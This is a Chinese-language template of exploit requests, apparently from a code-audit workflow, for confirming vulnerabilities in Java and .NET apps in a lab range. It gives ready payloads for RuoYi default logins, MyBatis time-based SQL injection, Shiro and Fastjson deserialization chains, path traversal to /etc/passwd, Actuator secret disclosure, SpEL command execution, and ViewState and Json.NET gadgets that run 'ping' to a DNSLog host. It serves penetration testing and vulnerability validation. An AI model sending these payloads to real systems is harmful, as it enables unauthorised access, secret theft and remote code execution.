# 常见框架快速验证模板

> 本文件提供常见 Java/Python/.NET 框架的即用验证模板。Phase 4 靶场验证时，根据 Phase 1 识别的技术栈选择对应模板。

## 1. RuoYi / 若依系列

### 1.1 默认凭据验证
```
POST /login HTTP/1.1
Host: {{target}}
Content-Type: application/json

{"username":"admin","password":"admin123"}
```
预期：200 + token/cookie → 登录成功

### 1.2 SQL 注入（MyBatis ${} 参数）
常见注入点：数据导出接口的排序/筛选参数
```
POST /system/user/list HTTP/1.1
Host: {{target}}
Content-Type: application/json
Cookie: {{session}}

{"pageNum":1,"pageSize":10,"orderByColumn":"user_id","isAsc":"asc; WAITFOR DELAY '0:0:5'--"}
```
判定：响应延迟 5 秒 → 存在时间盲注

### 1.3 Shiro 反序列化
前提：Cookie 中包含 rememberMe 字段

javachains 生成 payload：
```bash
java -jar scripts/tools/javachains/cli-chains.jar \
  -p JavaNativePayload \
  -g "CommonsCollectionsK1,TransformerWithSleep" \
  -a "time=5000"
```
将输出 Base64 编码后设置到 rememberMe Cookie：
```
GET / HTTP/1.1
Host: {{target}}
Cookie: rememberMe={{base64_payload}}
```
判定：响应延迟 5 秒 → Shiro 反序列化存在

### 1.4 任意文件下载
```
GET /common/download/resource?resource=/profile/../../../../etc/passwd HTTP/1.1
Host: {{target}}
Cookie: {{session}}
```
判定：响应包含 root:x:0:0 → 存在路径穿越

---

## 2. Spring Boot 通用

### 2.1 Actuator 未授权
```
GET /actuator HTTP/1.1
Host: {{target}}
```
检查 200 响应中暴露的端点列表。

高危端点：
```
GET /actuator/env HTTP/1.1
Host: {{target}}
```
判定：返回环境变量（含数据库密码、密钥等）→ 严重信息泄露

### 2.2 SpEL 注入
```
POST /api/search HTTP/1.1
Host: {{target}}
Content-Type: application/json
Cookie: {{session}}

{"query":"${T(java.lang.Runtime).getRuntime().exec('id')}"}
```
注意：SpEL 注入点因接口而异，需根据代码审计确定参数位置

### 2.3 Fastjson 反序列化
前提：接口接受 JSON 且使用 Fastjson 解析
```
POST /api/data HTTP/1.1
Host: {{target}}
Content-Type: application/json
Cookie: {{session}}

{"@type":"java.net.Inet4Address","val":"{{dnslog}}"}
```
判定：DNSLog 收到请求 → autoType 开启，Fastjson 可利用

进阶验证（使用 javachains）：
```bash
java -jar scripts/tools/javachains/cli-chains.jar \
  -p JavaNativePayload \
  -g "CommonsBeanutils2,TemplatesImpl,TomcatEcho" \
  -a "version=52"
```

---

## 3. MyBatis 注入验证

### 3.1 ${} 参数识别

代码层面：搜索 `${` 出现在 Mapper XML 或注解中的位置
靶场验证：

**排序注入**：
```
GET /api/list?orderBy=id;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: {{target}}
Cookie: {{session}}
```

**LIKE 注入**：
```
GET /api/search?keyword=test%25'+AND+SLEEP(5)--+ HTTP/1.1
Host: {{target}}
Cookie: {{session}}
```

**IN 子句注入**：
```
POST /api/batch HTTP/1.1
Host: {{target}}
Content-Type: application/json
Cookie: {{session}}

{"ids":"1) OR SLEEP(5)--"}
```

---

## 4. .NET 反序列化验证

### 4.1 ViewState 反序列化
前提：ASP.NET 应用使用 ViewState 且 MAC 验证关闭或密钥已知

ysoserial.net 生成 payload（需在 Windows 执行）：
```cmd
scripts\tools\yso-net-v2\ysoserial_frmv2.exe -f BinaryFormatter -g TypeConfuseDelegate -c "ping {{dnslog}}"
```

### 4.2 Json.NET 反序列化
```
POST /api/data HTTP/1.1
Host: {{target}}
Content-Type: application/json

{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c ping {{dnslog}}"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

---

## 5. 通用未授权验证

### 5.1 管理接口未授权
依次请求以下常见管理路径（无认证头）：
```
GET /admin HTTP/1.1
Host: {{target}}

GET /api/admin/users HTTP/1.1
Host: {{target}}

GET /system/user/list HTTP/1.1
Host: {{target}}

GET /manage HTTP/1.1
Host: {{target}}
```
判定：任一返回 200 + 用户数据 → 未授权访问

### 5.2 Swagger/API 文档暴露
```
GET /swagger-ui.html HTTP/1.1
Host: {{target}}

GET /v2/api-docs HTTP/1.1
Host: {{target}}

GET /swagger-resources HTTP/1.1
Host: {{target}}
```

---

## 使用说明

1. 根据 Phase 1 识别的技术栈选择对应章节
2. 替换 `{{target}}` 为靶场地址，`{{session}}` 为登录后的 Cookie/Token
3. 按模板发送请求，对比「判定」标准确认漏洞是否存在
4. 验证成功记录完整请求+响应到 `audit/poc/<vul-id>/evidence.txt`
5. 验证失败按 audit-validate SKILL.md 的差异分析与绕过流程处理
